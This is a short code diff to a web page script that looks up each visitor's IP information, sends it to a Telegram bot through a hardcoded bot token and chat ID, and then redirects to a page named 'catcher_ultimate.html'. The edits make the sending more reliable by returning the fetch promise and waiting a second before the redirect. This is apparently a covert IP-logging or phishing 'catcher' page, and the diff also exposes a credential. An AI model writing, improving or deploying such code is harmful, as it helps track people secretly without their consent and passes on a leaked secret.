@@ -17,7 +17,7 @@
       const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
       const chat_id = "6239813037";
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      await fetch(url, {
+      return fetch(url, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
@@ -39,7 +39,7 @@
       const ipData = await getIPInfo();
       const msg = formatMessage(ipData);
       await sendToTelegram(msg);
-
+      await new Promise(r => setTimeout(r, 1000));
       window.location.href = "catcher_ultimate.html";
     }
 
